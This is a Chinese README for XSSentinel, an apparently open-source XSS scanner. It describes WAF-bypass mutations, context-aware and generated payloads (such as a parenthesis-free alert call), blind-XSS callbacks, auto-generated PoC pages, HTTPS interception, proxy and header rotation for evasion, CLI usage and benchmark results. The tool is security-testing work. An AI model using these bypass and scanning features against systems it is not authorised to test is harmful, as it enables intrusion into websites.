# XSSentinel — 综合型 XSS 检测框架

> 一款**多层级、可扩展**的 XSS 检测工具：反射点上下文感知注入 + WAF 自适应绕过 + DOM 污点分析 +（可选）无头浏览器真实验证。

---

## ⚠️ 定位与诚实声明（请先读）

市面上成熟的商业工具（如 Acunetix、Burp Suite Pro、Netsparker）由大型团队长期维护，覆盖大量私有规则与爬虫能力。**没有任何一款开源工具能"全面超过"它们**——这是个移动靶。

XSSentinel 的目标是**在开源/自研工具中做到检测维度最全、架构最干净、最易扩展**：它把通常被单点工具割裂的能力整合进一个流水线，并且每一层都可单独替换/增强。它在以下方面优于常见的单技术 XSS 脚本：

- **6 层检测流水线**：反射 → WAF 绕过 → DOM 污点 → 存储型 → 盲打(OOB) → 无头确认，覆盖大多数工具只做其中 1–2 项的盲区。
- **上下文感知**：先判断输入反射在 HTML 元素 / 属性 / 脚本字符串 / 事件处理器 / `javascript:` URI / SVG / MathML / CDATA / 模板 `{{}}` / meta-refresh / HTML 注释等 **20+ 种上下文**，再选对应 payload。
- **反射画像驱动（Phase 31）**：反射确认后自动发一枚"三明治探针"（DalFox 式），识别哪些特殊字符被过滤/编码，按需把最可能命中的 payload 与 WAF 绕过变形排到队首（ZAP 式字符反馈闭环），预算利用率更高——benchmark 上同等精度下总耗时下降约 10%。
- **生成式 payload（Phase 32）**：不只检索语料，还按反射画像用**仅存活的字符**现场构造 payload（XSStrike 思路）；括号被过滤时自动切换为无括号的 tagged-template 调用 `alert\`1\``，能穿过拦住语料 payload 的过滤器。
- **签名级端点去重 + 内容类型降置信（Phase 32）**：爬虫产物按 `方法+主机+路径+参数名集合` 去重，分页/重复参数的端点不重复扫（DalFox 思路）；JSON/纯文本响应中的反射命中自动降为 low confidence（ZAP 思路），让人优先看真正的 HTML 汇聚点。
- **参数位置变换（Phase 33）**：WAF 常只守参数的原始位置——标准位置全部未确认且检测到 WAF 时，自动把 top payload 克隆到另一位置（query↔body）重发（Burp 思路），固定小预算不膨胀请求量。
- **审计优先级 + 策略预设（Phase 33）**：并发队列按攻击面价值排序（参数数 / POST / admin·comment 等敏感路径优先，Burp 思路）；`--scan-policy {quick,normal,deep}` 一键切换预算档位（ZAP Threshold/Strength 思路），显式 flag 始终覆盖预设。
- **自动预编码管道（Phase 34）**：自动识别 base64 / 双重 base64 / JSON-in-base64 / JWT 容器参数，把 payload 用**同样的容器重新包装**后注入（DalFox 思路）——JWT 保留 header 与签名段、JSON 追加字段；命中即跳过对结构化参数几乎无望的明文 payload 循环。
- **CSP 感知预算门控（Phase 35）**：strict CSP（内联被禁且分析器未发现绕过路径）时自动把反射 payload 预算切到早停档，nonce 策略保守放行（可能存在 nonce 泄露绕过）；可绕过的 CSP 保持全预算。`--async` 高吞吐模式同步接入预编码管道（Phase 43 修复：async 主入口的 `as_completed(async_generator)` 误用与 scan-policy 预设填充缺失均已修复，`--async` 单目标/批量现已端到端可用并有真实 HTTP 回归测试守护）。
- **验证器 RCDATA 加固（Phase 35）**：lxml 的 HTML 结构修复会把写在 `<title>/<textarea>/<xmp>` 内的标签提升到文档顶层、丢失 RCDATA 祖先——语义验证器现在在结构化解析**之前**先做原始文本 RCDATA 检查，杜绝该类罕见误报；真正的 `</title>` 后逃逸仍然照常确认。
- **WAF 自适应绕过**：检测到拦截后，自动套用 **23 种**变形/编码家族（混合大小写、HTML/JS/CSS/UTF-7 实体、注释打断、空字节、全角、构造器逃逸、重复属性等）生成绕过变体；数量以 `core/transform.py` 的 `REGISTRY` 为准，新增变形只改 REGISTRY 即可。
- **DOM XSS 静态污点分析**：不依赖服务器响应，直接分析前端 JS 的 source→sink 流（如 `location.hash` → `innerHTML`、jQuery `.html()`、`postMessage` 事件、`dangerouslySetInnerHTML`、`v-html`、`{{ }}` 等）。
- **JS AST 数据流分析（Phase 43）**：esprima ESTree 解析每个 `<script>` 块，跟踪污点变量跨声明/赋值/拼接的多跳传播（含压缩混淆代码与 postMessage 回调函数体），产出带 `[AST]` 标记的高置信 source→sink 链（DalFox v3 式）；解析失败透明回退正则通道（`pip install xssentinel[ast]` 启用，缺失时自动降级）。
- **DOM XSS 真·浏览器执行确认（L6 强化）**：在真实无头浏览器（Playwright）里给危险 sink 插桩——`innerHTML`/`outerHTML`/`document.write`/`Function`/`setTimeout`/`location.*`/`window.open`/`setAttribute(on*)`/jQuery `.html()` 等，并把唯一标记注入 `location.hash`/`location.search`/`document.cookie`/`postMessage` 等可控源。**标记一旦真正流入 sink，即判定为已确认（high）DOM XSS**——这是猜测式静态分析无法给出的硬证据（静态命中仅作为 medium/low 提示）。Playwright 不可用时优雅降级为静态启发式，不影响其他层。
- **存储型 XSS**：注入后重新拉取"展示页"确认持久化执行（多数开源工具不做）。
- **盲打 XSS（OOB）自动确认**：注入带唯一 token 的带外回调 payload，再轮询回调监听服务——**收到 beacon 即判定为已确认（high）盲打**，而非只"撒网不收网"。支持自托管监听器（`--oob self`，离线可测）与公共 interactsh（`--oob interactsh`，真实场景）。
- **双重确认**：语义确认（token 是否落在真实可执行汇聚点，且用 BeautifulSoup 结构化判定，可识别 `html.escape` 伪漏洞）+ 可选无头浏览器真实弹窗确认，显著降低误报。
- **深度爬虫**：`-c` 自动发现同域 `<a>` 链接与 `<form>` 端点（BFS，`--crawl-depth` 控深度，`--scope` 限域），连"无参数纯 DOM 页面"也纳入扫描——多数单脚本工具跑完一个 URL 就停了。
- **发现去重**：`dedup()` 按 `(type, URL, param, context)` 合并经不同爬取路径/变形变体发现的同一漏洞，避免重复告警刷屏（DOM 类忽略 query 差异）。
- **隐藏参数挖掘（Phase 43）**：内置 313 个高产出候选词（分页/token/回跳/模板等 14 类），`--param-wordlist` 可追加自定义词表（操作符提示前置）；fuzzer 差分 triage 从大词表挑 top-N 深测，请求量可控。
- **双引擎精度对齐（Phase 43）**：`benchmark/runner.py --engine {sync,async}` 用同一 98 用例矩阵分别标定两条流水线——async 经 CSP 响应头门、转义实体窗口、mXSS payload 自带结构守卫三层修复后已达 **recall 100% / precision 100% / FPR 0**，与 sync 完全对齐（Phase 69 重新标定：sync 98 用例 TP=64/FP=0/FN=0，recall/precision 100%，FPR 0——此前本机退化 loopback 曾出现 1 例环境性假 FN，单跑该用例 0.2s 即检出；runner 现对出错用例自动重试，且**漏洞用例若最终无法完成计入 FN**，不再让跑不完的用例悄悄缩小 recall 分母。Phase 176n 补上这句话当时做不到的部分：旧闸门是 `verdict != "FN"`，**只有出错的漏洞用例被重试**，出错的安全用例首试即被接受、直接从分母消失；现由 `_evaluate_with_retries()` 两类一并重测（并发路径此前一次都不重试），产物并记录 `engine` / `retried_cases` / 每例 `retries`）。**注意该标定已被 Phase 91/92 刷新**：当时 async 基线里 3 个 safe 用例存在从未暴露的误报（Phase 84 引入），最新数字见文末「当前基线」表——precision 仍是 1.000，但 recall 分母口径下的 FN 需先单跑复现再判定。
- **可复现 PoC**：每个确认漏洞自动产出 **curl 命令 + 含 payload 的 URL + 自包含 HTML PoC 页面**（iframe / 自动提交表单 / `location.hash` 触发 DOM），HTML/JSON/CSV/SARIF 四报告均携带，直接交差或进缺陷单。
- **被动代理扫描（Phase 44）**：`--passive` 起本地 HTTP 代理（对标 xray / w13scan 的被动模式），浏览器/工具挂代理即可把流量捕获进扫描流水线——按 `方法+主机+路径+参数名集合` 签名去重（分页/翻 token 不重扫），GET/POST 表单与 JSON body 全解析，HTTPS 默认走 CONNECT 隧道透传；加 `--mitm-ca ca.pem`（Phase 50）则自动生成本地 CA 并对 scope 内主机做 HTTPS 拦截——每主机证书由该 CA 签发，把 CA 证书 `ca-cert.pem` 装进浏览器/系统信任库后 HTTPS 参数/body 也能被捕获扫描（越 scope 主机保持盲透传）；后台 worker 把捕获端点直接喂给 L1 流水线，`--sqli-check` / `--check-outdated-js` 快检可联动（见下）。写端点（POST/PUT/PATCH）扫描后自动进入 **stored 二阶观察**：对 body 参数注入唯一 token 探针，之后浏览到的任意页面若原样渲染该 token（可执行上下文）即确认 high `second_order` finding——存储型 XSS 无需手动指定注入/查看端点（Phase 67）。
- **目标级 CORS / XS-Leaks 审计（Phase 51/53）**：每 origin 探测 Origin 反射（GET+OPTIONS 兜底）——反射任意 Origin+Allow-Credentials → high `cors_misconfig`；`--audit-xs-leaks` 对无任何跨源隔离头（COOP/CORP/COEP/帧守卫）的页面记 low `xs_leak_surface`；`xs_leaks.py` 另附 img/frame-timing/window.name/history 四信道载荷库与免服务器演示 PoC（证明已确认 XSS 的跨站窃取半径）。sync/async 双引擎对齐（Phase 54）。
- **生态导出保真（Phase 55）**：nuclei 导出按 finding 真实载体重放——query 反射走参数、上传走 multipart raw、`(header:X)`/`(cookie:X)` 走 raw 请求头/Cookie、path/error 走百分号编码路径（均有 nuclei live-MATCH 回归测试）；Burp XML 内嵌可复现请求。
- **SQLi 错误回显快检（Phase 44）**：`--sqli-check` 对标 dalfox grep 引擎 / xray sqldet——向每个参数注入 7 枚引号类探针，用 MySQL / PostgreSQL / MSSQL / Oracle / SQLite 五家族指纹正则匹配数据库错误回显（无回显不报），命中即报 finding 并停止该参数，先做 baseline 跳过本身就带 DB 错误的页面。
- **过时 JS 库扫描（Phase 44）**：`--check-outdated-js` 对标 XSStrike retireJS——解析 `<script src>`，版本提取锚定库名（`/static/v2/jquery.min.js` 的 v2 不误判为 jQuery 版本），比对 jQuery / AngularJS / Bootstrap / Vue / Underscore / Lodash / Handlebars 七库的已知 CVE 版本区间，命中即报 outdated_js_lib（medium/high）。
- **镜像页防护（Phase 78）**：param_miner 哨兵预探测（3 个随机哨兵全反射=镜像页，3 请求替代 100 候选洪水）+ 滚动反射比熔断（近 15 次 ≥85% 反射即 collapse，保留 1 个"任意参数"代表项）——吸收自 DalFox 2025 发现管线。
- **FUZZ 任意位置注入（Phase 79/80）**：`--fuzz-body '{"filter": FUZZ}' --fuzz-marker FUZZ` —— body 模板内任意位置（JWT 内层/XML 节点/深层 JSON 叶子）的标记全量替换注入，反射（raw/URL 编码）与确认（verbatim 未转义 + 危险形状）分级报告；`--fuzz-body @file` 支持模板文件。吸收自 DalFox FUZZ 模式。
- **BAV 联动探针（Phase 81/82）**：`--bav` —— 隐藏参数挖掘命中的参数顺带做三类相邻漏洞探测：SSTI（{{777*'7'}}→5439 唯一常数）、CRLF（注入响应头回显）、开放重定向（3xx Location 指向唯一 host），各一请求、无模糊启发式；确认项入报告（type `bav`）。吸收自 DalFox BAV 分析。
- **原始请求文件输入（Phase 83）**：`--raw-request captured.txt` —— Burp/ZAP "copy as raw" 格式直接作为扫描入口：方法/URL（Host 构造）/头/Cookie/body 全部回填后走完整扫描管线（认证/OOB/爬取/报告继承），无平行弱实现。对齐 DalFox `--rawdata`。
- **批量输入管道（Phase 87 P0）**：`--batch urls.txt` 与 `--batch-stdin`（管道流式喂入，一行一个 URL，# 注释）——侦察链（httpx/gau/wayback）输出可直接接进扫描器，URL 去重、失败目标不中断整批、按目标分报告。对齐 DalFox pipe 模式。
- **HAR 导入（Phase 88 P1）**：`--har capture.har` —— 浏览器 DevTools/Burp/ZAP 导出的 HTTP Archive 直接作为扫描入口：每个捕获请求展开为一个真实端点，method/form·JSON body/cookie/自定义头全部回填后走完整扫描管线（对齐 Burp/XSpear 的 HAR 入口）。
- **OpenAPI/Swagger 导入（Phase 89 P1）**：`--openapi spec.json` —— 文档化的 API 契约（OpenAPI 3.x / Swagger 2.0）直接作为扫描入口：每个 path+operation 展开为端点（含浏览器从未访问过的路由），路径模板 `{id}` 按 example/schema 链解析为样本 URL，form/JSON body 由 schema 构建，apiKey/bearer 安全声明转为请求头。与 HAR 互补：HAR 覆盖"实际流量"，OpenAPI 覆盖"声明面"。
- **抗劣化分批基准跑（Phase 44，Phase 91 扩参）**：`benchmark/run_benchmark_batched.py [out.json] [batch] [port] [sync|async] [max_payloads] [max_transforms] [timeout]` —— `run_benchmark.py` 在单进程内跑完 98 用例，遇到会间歇掐 loopback 的安全软件（WinError 10053/10054）时必然卡在中途（实测 7 次 0 完成）；分批版按小批（默认 6）评估、**每批落盘**、支持中断续跑与失败重试。位置参数 4-7 可选（默认 sync/10/6/45），传 `sync 14 12 90` 即复现标定口径；续跑时预算变了会丢弃旧结果。**Windows 本机跑完整矩阵请用这个入口**（默认预算 6–7 分钟全矩阵，14/12/90 口径 sync 约 12 分钟、async 约 25 分钟）。
- **多格式报告 + 并发**：HTML / JSON / CSV / **SARIF(2.1.0) / JUnit / Markdown** 六格式，SARIF 可直接接入 CI / 缺陷平台（如 GitHub code scanning、Defender、Jira）；多线程端点/参数并发扫描。

**只用于你被授权测试的系统。**

---

## 检测架构（6 层）

```
L1  反射层    探针定位反射点 → 上下文分析(20+ 种) → 按上下文选 payload 并发射
L2  WAF 绕过   命中拦截 → 套用 23 种变形/编码家族生成变体 → 再尝试
L3  DOM 层     静态分析页面 JS：source( location/document/postMessage… ) → sink( innerHTML/eval/jQuery… )
L4  存储层     注入 → 重新拉取"展示页" → 确认持久化执行
L5  盲打层     (可选)为每处注入生成唯一 token 的 OOB payload → 轮询回调监听 → 收到 beacon 即"已确认"盲打
L6  无头/DOM   (可选)Playwright 真实渲染：① 对 DOM sink 插桩并注入唯一标记，标记流入 sink 即"已确认"DOM XSS；
        动态确认   ② 捕获 dialog 事件作为反射型铁证
        │
        └─ 每层结果都经过"语义确认"：注入唯一 token，确认它落在真实可执行位置
           而非仅被原样回显（可有效识别 html.escape 后的伪漏洞）

发现层（串联上述检测层）：
  • 深度爬虫  -c（BFS，--crawl-depth 控制深度，--scope 限域）：自动发现同域
             <a> 链接与 <form> 端点，连无参数的纯 DOM 页面也纳入扫描。
  • 去重      dedup()：按 (type, URL, param, context) 合并多路径/多变形发现的同一
             漏洞，避免重复告警（DOM 类忽略 query 差异）。
  • 可复现 PoC - 每个确认漏洞自动生成 curl 命令、含 payload 的 URL、以及自包含
             HTML PoC 页面（iframe / 自动提交表单 / location.hash 触发 DOM），
             直接交给同事或写进报告。
```

---

## 安装

```bash
cd xssentinel
python -m venv .venv && .venv\Scripts\activate     # Windows
#   或：source .venv/bin/activate                  # Linux/macOS
pip install -e .                                   # 依赖：requests, beautifulsoup4
```

可选（用于 L4 无头浏览器确认）：
```bash
pip install playwright && playwright install chromium
```

---

## 快速使用

### 命令行

```bash
# 扫描单个 GET 参数（自动从 URL ?q= 提取）
python -m xssentinel -u "https://example.com/search?q=test" -o report.html

# POST 表单
python -m xssentinel -u "https://example.com/comment" -m POST -d "name=x&bio=y"

# 带认证 / 代理
python -m xssentinel -u "https://example.com/p" -H "Authorization: Bearer XXX" -b "session=yyy"

# 表单登录（认证感知爬取）：登录成功后 cookie/token 自动携带，会话丢失自动重登
python -m xssentinel -u "https://example.com/app" -c \
  --login-url "https://example.com/login" --login-user user --login-pass pass \
  --login-field-user username --login-field-pass password \
  --login-success-marker "dashboard" --auth-relogin-on-loss

# 断点续扫：大站中断后从检查点继续（已扫端点不重扫）
python -m xssentinel -u "https://example.com" -c --checkpoint cp.json
python -m xssentinel -u "https://example.com" -c --checkpoint cp.json --resume

# 爬取表单与链接后逐个扫描（默认深度 2）
python -m xssentinel -u "https://example.com" -c

# 深度爬虫：加大深度 + 限定 scope 前缀（只爬该路径下的同域页面）
python -m xssentinel -u "https://example.com/app" -c --crawl-depth 3 --scope "https://example.com/app"

# 深度爬虫会去重并自动为每个确认漏洞生成可复现 PoC（见报告 PoC 列）

# 真·浏览器确认（需 playwright）
python -m xssentinel -u "https://example.com/search?q=test" --headless

# DOM-XSS 引擎选择（默认 auto：装了 playwright 就用真浏览器确认，否则退化为静态启发式）
python -m xssentinel -u "https://example.com/search?q=test" --dom-engine auto
# 强制使用真浏览器（未装 playwright 会优雅降级，仍给出静态结论）
python -m xssentinel -u "https://example.com/search?q=test" --dom-engine playwright
# 仅用静态启发式（不启动浏览器，最快）
python -m xssentinel -u "https://example.com/search?q=test" --dom-engine static

# 六种报告（-f 支持 html,json,csv,sarif,junit,markdown）
python -m xssentinel -u "https://example.com/search?q=test" -f json -o report.json
python -m xssentinel -u "https://example.com/search?q=test" -f sarif -o report.sarif

# 存储型 XSS（注入 /store，再拉取 /view 确认）
python -m xssentinel -u "https://example.com/p" --stored-inject https://example.com/store --stored-view https://example.com/view

# 盲打 XSS 自动确认（自托管监听器，离线/测试用，收到 beacon 即确认）
python -m xssentinel -u "https://example.com/search?q=test" --oob self

# 盲打 XSS 自动确认（公共 interactsh 服务器，真实场景）
python -m xssentinel -u "https://example.com/search?q=test" --oob interactsh

# 并发扫描（4 线程）
python -m xssentinel -u "https://example.com/search?q=test" --threads 4

# 声明式多步场景（存储流等；JSON 配置，Nuclei 风格）
python -m xssentinel -u "https://example.com/comment" --scenarios my_scenarios.json

# 被动代理扫描：浏览器/工具挂本代理，流量自动进扫描流水线（对标 xray/w13scan）
python -m xssentinel --passive --proxy-port 8080 --sqli-check --check-outdated-js
#   浏览器设置 HTTP 代理 http://127.0.0.1:8080 即可；HTTPS 默认 CONNECT 隧道透传
#   --mitm-ca mitm/ca.pem 开启 HTTPS 拦截（自动生成 CA）；先装 mitm/ca-cert.pem 到信任库
#   捕获端点按 方法+主机+路径+参数名集合 去重，Ctrl+C 退出并写出报告
#   multipart 上传请求的文件字段会被自动识别并路由到上传 filename XSS 探针

# 上传 filename XSS（sync 与 --async 通用；--upload-field 可重复给出多个字段）
python -m xssentinel -u "https://example.com/up" -m POST --upload-field file

# SQLi 错误回显快检（对标 dalfox grep 引擎，独立模式）
python -m xssentinel -u "https://example.com/search?q=1" --sqli-check

# 过时 JS 库扫描（对标 XSStrike retireJS）
python -m xssentinel -u "https://example.com" --check-outdated-js
```

常用参数：`-m/--method`、`-d/--data`、`-c/--crawl`、`--headless`、`--timeout`、
`--scan-policy {quick,normal,deep}`（策略预设，显式 flag 覆盖预设；max-transforms / max-payloads / threads 的默认值由预设档位决定——normal 档为 12 / 10 / 4，quick 档更低，显式传参始终优先）、
`--max-transforms`（绕过变体数，随预设档位）、`--max-payloads`（每上下文最大 payload 数，随预设档位）、
`--threads`（并发线程数，随预设档位）、`--oob {self,interactsh}`（盲打自动确认模式）、
`--oob-timeout`（等待回调秒数，默认 12）、
`--dom-engine {auto,playwright,static}`（DOM-XSS 引擎：auto=有 playwright 用真浏览器确认、否则静态；playwright=强制真浏览器；static=仅静态启发式，默认 auto）、
`--stored-inject` / `--stored-view` / `--stored-param`（存储型扫描）、
`-o/--output`、`-f/--format {html,json,csv,sarif,junit,markdown,burp,nuclei}`（burp=Burp XML、nuclei=每 finding 一个可运行模板目录）、
`--upload-field`（上传 filename XSS，见上）、
`--audit-xs-leaks`（XS-Leaks 表面审计：无 COOP/CORP/COEP/帧守卫的页面记 low）、
`--login-*` / `--oauth-*` / `--auth-*`（认证感知爬取，见上）、
`--checkpoint` / `--resume`（断点续扫）、`--rate-limit`（全局限速）、
`--proxy` / `--proxy-list`（出口代理/轮换）、`--rotate-headers` / `--jitter-ratio`（指纹与节奏扰动）、
`--second-order-*`（二次注入：注入点与查看点分离的存储型流）、
`--verify-fix` / `--diff`（对 JSON 报告重放确认修复情况）、
`--no-verify-ssl`。

**批量输入（Phase 87 P0/P1）：**

```bash
# 批量 URL 文件（每行一个，# 注释）→ 每个目标一份报告到 -o DIR
python -m xssentinel --batch urls.txt -o reports/

# 管道输入：侦察工具直接流式喂入（httpx/gau/wayback 输出兼容）
# （Pipe mode，一行一个 URL；TTY 下会提示需要管道输入）
httpx -l in.txt | python -m xssentinel --batch-stdin -o reports/

# HAR 导入：浏览器 DevTools / Burp / ZAP 导出的 .har 直接作为扫描入口
# 每个捕获到的请求 = 一个真实端点：method/form·JSON body/cookie/自定义头
# 全部回填后走完整扫描管线（对齐 Burp/XSpear 的 HAR 入口）
python -m xssentinel --har capture.har -o reports/ -f json

# OpenAPI/Swagger 导入：文档化的 API 契约直接作为扫描入口
# 每个 path+operation = 一个端点（含浏览器从未访问的路由）；路径模板
# {id} 解析为样本 URL，body 由 schema 构建，apiKey/bearer 转为请求头
python -m xssentinel --openapi openapi.json -o reports/ -f json
```

三个批量源（`--batch` / `--batch-stdin` / `--har` / `--openapi`）与 `-u` 互斥，报告均按目标
分文件写入 `-o DIR`；URL 去重、失败目标不中断整批、结束时汇总统计。

### 作为库调用

```python
from xssentinel.core.requester import Requester
from xssentinel.core.scanner import Scanner

sc = Scanner(requester=Requester(timeout=10))
sc.scan_target("https://example.com/search", method="GET", params={"q": "test"})
for f in sc.findings:
    print(f.data["type"], f.data["context"], f.data["payload"])
```

---

## 目录结构

```
xssentinel/
├── __main__.py            # CLI 入口（参数定义/策略预设/main 分发；Phase 43 拆分）
├── cli_runner.py            # 扫描执行：单目标 / async 单目标 / async 批量 / 报告写出
├── cli_commands.py          # 子命令：self-test / serve / verify-fix / diff / passive（Phase 44）
├── data/
│   └── payloads.json      # 上下文分类的 payload 语料（可自由扩展）
└── core/
    ├── requester.py       # HTTP 层（会话/代理/超时/SSL）
    ├── context.py         # 反射点上下文分析器
    ├── reflection_profile.py  # 反射画像（三明治探针 + 字符过滤反馈闭环）
    ├── generator.py       # 生成式 payload 构造器（仅用存活字符拼装）
    ├── pre_encode.py      # 自动预编码管道（base64/JWT/JSON 容器同构注入）
    ├── payloads.py        # payload 语料加载与按上下文检索
    ├── transform.py       # 23 种 WAF 绕过变形/编码家族（REGISTRY 为准）
    ├── waf.py             # WAF/拦截指纹识别
    ├── verifier.py        # 语义确认 + 无头确认（BeautifulSoup 结构化判定）
    ├── dom.py             # DOM XSS 静态污点分析
    ├── dom_engine.py      # DOM XSS 真·浏览器执行确认（Playwright 插桩 + 标记溯源）
    ├── poc.py             # 可复现 PoC 生成（curl / URL / 自包含 HTML）
    ├── scanner.py         # Scanner 核心类（L1 流水线/确认/去重；Phase 40 起
    │   │                  #  与 StoredBlind/AdvancedLayer/Crawl 三个 Mixin 组合）
    ├── scanner_stored.py  # StoredBlindMixin：L4 存储两步 + L5 盲打 OOB 收网
    ├── scanner_layers.py  # AdvancedLayerMixin：L3 DOM + L7 jsonp/csp/cors/mXSS/
    │   │                  #  clobber/template/polyglot
    ├── scanner_crawl.py   # CrawlMixin：SPA 无头爬取 + 隐藏参数挖掘 + BFS
    ├── cors_check.py      # 目标级 CORS 审计（Phase 51：Origin 反射 + 凭据判定）
    ├── xs_leaks.py        # XS-Leaks（Phase 53：隔离头审计 + 通道载荷库/演示 PoC）
    ├── findings.py        # Finding 数据类 + 默认变形阶梯（mixins 共享）
    ├── scenarios.py       # 声明式多步检测场景引擎（--scenarios，Nuclei 风格）
    ├── passive_proxy.py   # 被动代理扫描（Phase 44：捕获→去重→喂 L1，对标 xray/w13scan）
    ├── sqli.py            # SQLi 错误回显 grep 引擎（Phase 44，对标 dalfox/xray sqldet）
    ├── retire_js.py       # 过时 JS 库扫描（Phase 44，对标 XSStrike retireJS）
    ├── layers/            # 高级检测层实现包（Phase 39 拆分）
    │   ├── client_layers.py     # postMessage/原型污染/SW/Worker/重定向/框架/GraphQL/WS
    │   ├── transport_layers.py  # header/path/cookie/error 注入
    │   ├── content_layers.py    # markdown/TT/CSP nonce/cookie tossing/SRI/import map
    │   │                        # sanitizer/CSSI/dangling markup/SVG
    │   └── common.py            # 共享 _make_finding
    ├── advanced_layers.py # 高级层门面（run_* 入口 + 向后兼容 re-export）
    ├── fix_advice.py      # 修复建议引擎（语料在 data/fix_advice.json）
    └── report.py          # HTML / JSON / CSV / SARIF / JUnit / Markdown 报告（含 PoC 渲染）
tests/
├── vuln_server.py         # 本地脆弱测试服务（自测用，含 WAF 模拟端点）
├── run_self_test.py       # 逐层自检脚本
└── demo_scan.py           # 生成综合演示报告 demo_report.html / .json
```

---

## 自检 & 演示

本仓库自带一个**仅用于本地验证**的脆弱服务器，覆盖全部检测上下文：

```bash
# 终端 1：启动测试服务
python tests/vuln_server.py          # http://127.0.0.1:8899

# 终端 2：逐层自检（/safe 必须 0 命中）
python tests/run_self_test.py

# 生成综合报告
python tests/demo_scan.py            # 产出 tests/demo_report.html / .json

# 靶场 2：真实世界风格场景（半破损过滤器/上下文陷阱/二级存储/CSP nonce 泄露/
# DOM srcdoc·cookie·name 变体，Playwright 全链路确认）
python tests/run_range2.py           # 20 用例自动判定 TP/TN/FP/FN

# 被动代理演示（Phase 44）：起内建 origin + 被动代理 + 真实 Scanner，
# 回放 3 个浏览器式请求，验证 捕获→去重→扫描→发现→报告 全链路（含 /safe 零误报自检）
python tests/passive_demo.py         # 产出 tests/passive_demo_report.html
```

端点含义：`/echo`(HTML 元素)、`/attr`(双引号属性)、`/script`(脚本字符串)、
`/href`(href URI)、`/evt`(事件处理器)、`/dom`(DOM 污点)、
`/waf`(模拟 WAF 拦截 `<script>`，验证绕过层)、`/cdata`(CDATA 反射)、
`/meta`(meta-refresh 反射)、`/tpl`(`{{ }}` 模板反射)、
`/store`+`/view`(存储型 XSS)、`/safe`(html.escape，必须零误报)、
`/links`(爬虫 fixture：链接到上述多个端点 + POST 表单，用于验证深度爬虫/去重/PoC)。

验证结果（本地，全部层开启）：约 17 个发现（含反射 / DOM 动态确认 / 存储 / 盲打），WAF 被正确指纹识别，
`/safe` 端点在改进确认逻辑与盲打门控后**零误报**。`tests/run_self_test.py` 会断言每层均触发、`/safe` 为零（含 L6 真浏览器 DOM 确认），并单独用深度爬虫扫描 `/links` 验证发现去重与可复现 PoC 生成。

靶场 2（`tests/range2_server.py` + `tests/run_range2.py`）覆盖 benchmark 矩阵之外的真实世界缺陷：递归剥 script、单引号属性、onload 黑名单、空格过滤、mXSS 变异、未闭合引号属性、`--!>` 注释断点、正则字面量上下文、二级存储、**CSP nonce 泄露自动利用**（读取页内泄露的 nonce 构造同 nonce script，验证器对「nonce 与响应 CSP 头一致」的 script 放行——nonce 轮换的服务器不会被误确认）、iframe.srcdoc / cookie / window.name / 多跳 innerHTML 等 DOM 变体。当前成绩 **20 漏洞全报 / 6 安全零误报**（含 second_order 注入/查看双端点路径）——Phase 63 扩容后新增四类真实世界场景：JSON API（application/json 载体按文档 leaf 探测）、RESTful PUT multipart 上传 filename、CORS Origin 反射 + Allow-Credentials（high cors_misconfig）、XS-Leaks 无隔离面（--audit-xs-leaks 记 low），以及一个带 COOP/CORP/COEP 隔离头的安全负样本。

测试策略（Phase 37）：`tests/test_pipeline.py` 把靶场 2 的精简切片纳入 pytest —— **主流程回归在每次 pytest 就会暴露**，不再依赖手动靶场演练；`tests/test_async_pipeline.py` 补上 async 扫描器首批测试（曾靠 0% 覆盖掩盖了 `for_context` 缺失导致 async L1 静默失效的 bug）；core 的 verbose 诊断已统一路由到 `logger.debug`（`--verbose` 即 DEBUG 级）。Phase 43 补齐 `tests/test_fuzzer.py`（`--fuzz` 七个评分维度全断言，覆盖率 0%→全路径）与 `tests/test_form_miner.py`（表单抽取/填充/端点转换），并拆分 `__main__.py`（1145→497 行 + cli_runner/cli_commands）。Phase 44 新增三个测试文件共 42 例：`tests/test_passive_proxy.py`（签名去重/scope 匹配/body 解析/裸 socket 真代理端到端捕获 + 真实 Scanner 反射命中回归）、`tests/test_sqli.py`（五家族指纹全路径 + 真回显服务命中）、`tests/test_retire_js.py`（库名锚定版本提取防路径数字泄漏/版本区间边界/去重）。

**当前基线（2026-09-24 实测，192 用例矩阵，两引擎同一口径）**：`benchmark/run_benchmark.py`，默认预算 10/6/90；结果 `benchmark/results/benchmark_20260924_022744.json`（sync）与 `benchmark_20260924_231718.json`（async）。**两引擎并不对齐**，见下表下注：

| 引擎 | 用例 | TP | FP | TN | FN | ERROR | recall | precision | FPR | 墙钟 |
|------|------|----|----|----|----|-------|--------|-----------|-----|------|
| sync | 192 | 113 | 0 | 79 | 0 | **0** | 1.000 | 1.000 | 0.000 | 1214s |
| async | 192 | 100 | 0 | 76 | **10** | **0** | **0.909** | 1.000 | 0.000 | 1186s |

- **192/192 全部计分**（`scored=192`、`errors=0`、产物里新增 `engine` / `retried_cases` 字段）。
  上一轮同一改动集是 `errors=1`：`neg-graphql-01` 在扫描里 90.036s 超时被判 ERROR，
  而单跑 9.2s 就是 TN。根因不是那条用例慢，是**重试策略只重试出错的"易受攻击"用例**
  （`runner.py` 旧闸门 `verdict != "FN"`），出错的**安全**用例首试即被接受、
  直接从分母消失——一趟跑可以报双 1.0 而其中一格从未被测。现已由
  `_evaluate_with_retries()` 对两类一并重测（串行与**并发路径**此前完全不重试），
  预算用尽仍保留 ERROR/FN，不把"没扫完"洗成"扫了没发现"。
- **两个引擎现在并排，但结论是「不对齐」**：`--async` 在同口径下漏 10 条（recall 0.909），
  **误报仍为 0**。逐格独立重跑 2 次全部复现且 `error=''`，所以不是环境窗口。分组：
  **6 条是异步引擎没有对应的层**（`form_miner` / `js_miner` / `second_order` /
  `scenario` / `cookie_tossing` / `time_based` 在 `async_scanner.py` 中被引用 0 次），
  3 条是候选选择分歧（`pos-url-04` / `pos-cdata-01` / `neg-filter-05`，异步发满 104 个请求
  仍不中），1 条（`pos-dom-02`）原因未定。**因此 `--async` 目前不适合作为"扫全"的入口**：
  它快、零误报，但覆盖范围小于同步引擎，选它的人应当知道少了哪几层。
- 另注：`pos-jsmine-01` 在整轮矩阵里同步是 TP（162 请求），单独复跑同步却是 FN（23 请求）
  ——同步侧存在**顺序/状态依赖**，所以"sync FN=0"这一格不是逐格稳定复现的头条，
  见 `实战验证交付报告` 176r。

**历史基线（2026-09-06 实测，Phase 93 后，98 用例，预算 14/12/90）**：`benchmark/results/post_audit_sync.json` / `post_audit_async.json`：

| 引擎 | TP | FP | TN | FN | ERROR | recall | precision | FPR | 全矩阵耗时 |
|------|----|----|----|----|-------|--------|-----------|-----|-----------|
| sync | 64 | 0 | 34 | 0 | 0 | 1.000 | 1.000 | 0.000 | 809s |
